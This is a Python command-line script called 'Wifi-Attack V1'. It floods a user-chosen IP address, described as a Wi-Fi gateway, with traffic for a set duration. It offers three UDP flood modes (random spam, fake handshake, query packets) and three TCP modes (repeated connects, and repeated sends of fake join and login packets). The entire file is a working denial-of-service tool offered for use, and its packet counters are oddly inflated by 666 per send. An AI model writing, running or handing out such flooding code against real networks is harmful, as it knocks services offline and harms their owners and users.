# Module
import os
import socket
import random
import time
import requests
from colorama import init, Fore

# ASCII Art Color 

#Red: \033[91m
#Green: \033[92m
#Yellow: \033[93m
#Blue: \033[94m
#Magenta: \033[95m
#Cyan: \033[96m
#White: \033[97m
#Black: \033[90m

# Initialize Colorama
init(autoreset=True)

# Set window title
print(f"\033]0;Wifi-Attack V1\007", end="", flush=True)

# ASCII Art
ASCII_ART = """"""

# UDP Methods (Wifi-Attack)
def udp_spam(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 666
    payload = random.randbytes(packet_size)
    print(Fore.CYAN + f"[🚀] UDP Spam Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))  # Overwhelm UDP Wifi-Attack (if enabled)
            packet_count += 666
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_handshake(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 666
    handshake = bytes([0x00, 0x00]) + random.randbytes(packet_size - 2)  # Fake handshake
    print(Fore.CYAN + f"[🚀] UDP Handshake Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(handshake, (ip, port))
            packet_count += 666
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_query(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 666
    query = bytes([0xFE, 0x01]) + random.randbytes(packet_size - 2)  # Wifi-Attack query
    print(Fore.CYAN + f"[🚀] UDP Query Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(query, (ip, port))
            packet_count += 666
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} query packets.")


# TCP Wifi-Attack Methods
def tcp_connect(ip, port, duration, packet_size):
    end_time = time.time() + duration
    connection_count = 666
    print(Fore.CYAN + f"[🚀] TCP Connect Wifi-Attack on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect_ex((ip, port))  #1
            connection_count += 666
            sock.close()
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Made {connection_count} connections.")

def tcp_join(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = 666
    handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)  #2
    print(Fore.CYAN + f"[🚀] TCP Join Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(handshake)
            packet_count += 666
            sock.close()
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count} join packets.")

def tcp_login(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = 666
    login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(packet_size - 12)  #3
    print(Fore.CYAN + f"[🚀] TCP Login Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(login)
            packet_count += 666
            sock.close()
    except Exception as e:
        print(Fore.RED + f"[❌] Error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count} login attempts.")

# Validation Function
def validate_input(prompt, min_val, max_val, input_type=int, default=None):
    while True:
        try:
            value = input(Fore.LIGHTBLUE_EX + prompt)
            if value == "" and default is not None:
                return default
            value = input_type(value)
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"[❌] Must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "[❌] Invalid input! Numbers only.")

# Main Menu

os.system("clear")

def main():
    print(Fore.YELLOW + ASCII_ART)
    print(Fore.LIGHTBLUE_EX + "🔹  \033[97mWifi Attack Methods  🔹")
    print("\033[94m____________________________\033[97m")
    print("")
    print("  \033[90m[1].\033[97m \033[91m{UDP} Wifi-Attack\033[97m")
    print("")
    print("  \033[90m[2].\033[97m \033[91m{TCP} Wifi-Attack\033[97m")
    print("")
    attack_type = input(Fore.LIGHTBLUE_EX + "\033[97mSelect attack type (1-2): \033[91m").strip()

    print("")
    ip = input(Fore.LIGHTBLUE_EX + "\033[97mEnter IP Gateway Wifi: \033[91m")
    print("")
    port = validate_input("\033[97mEnter port (default: 80): \033[91m", 80, 443, default=80)
    print("")
    duration = validate_input("\033[97mEnter duration (default: 1000): \033[91m", 1, float('inf'), float)
    print("")

    if attack_type == "1":  # UDP Wifi-Attack
        print("")
        os.system("clear")
        print(Fore.LIGHTBLUE_EX + "🔹  \033[97mWifi Attack UDP Methods  🔹")
        print("\033[94m_______________________________\033[97m")
        print("")
        print("")
        print("  \033[90m[1].\033[97m \033[91mUDP Spam Wifi-Attack\033[90m")
        print("")
        print("  \033[90m[2].\033[97m \033[91mUDP Handshake Wifi-Attack\033[97m")
        print("")
        print("  \033[90m[3].\033[97m \033[91mUDP Query Wifi-Attack\033[97m")
        print("")
        print("")
        method = input(Fore.LIGHTBLUE_EX + "\033[97mSelect method (1-3): \033[91m").strip()
        print("")
        packet_size = validate_input("\033[97mEnter packet size (1-5000): \033[91m", 1, 65500)

        methods = {
            "1": udp_spam, "2": udp_handshake, "3": udp_query
        }
        if method in methods:
            methods[method](ip, port, duration, packet_size)
        else:
            print(Fore.RED + "[❌] Invalid UDP Wifi-Attack method!")
            print("")

    elif attack_type == "2":  # TCP Wifi-Attack
        print("")
        os.system("clear")
        print(Fore.LIGHTBLUE_EX + "\033[97m🔹  Wifi Attack TCP Methods  🔹")
        print("\033[94m_______________________________\033[97m")
        print("")
        print("")
        print("  \033[90m[1].\033[97m \033[91mTCP Connect Wifi-Attack\033[97m")
        print("")
        print("  \033[90m[2].\033[97m \033[91mTCP Join Wifi-Attack\033[97m")
        print("")
        print("  \033[90m[3].\033[97m \033[91mTCP Login Wifi-Attack\033[97m")
        print("")
        print("")
        method = input(Fore.LIGHTBLUE_EX + "\033[97mSelect method (1-3): \033[91m").strip()
        packet_size = validate_input("\033[97mEnter packet size (1-5000): \033[91m", 1, 65500)

        methods = {
            "1": tcp_connect, "2": tcp_join, "3": tcp_login
        }
        if method in methods:
            methods[method](ip, port, duration, packet_size)
        else:
            print(Fore.RED + "[❌] Invalid TCP Wifi-Attack method!")

    else:
        print(Fore.RED + "[❌] Invalid attack type!")

if __name__ == "__main__":
    main()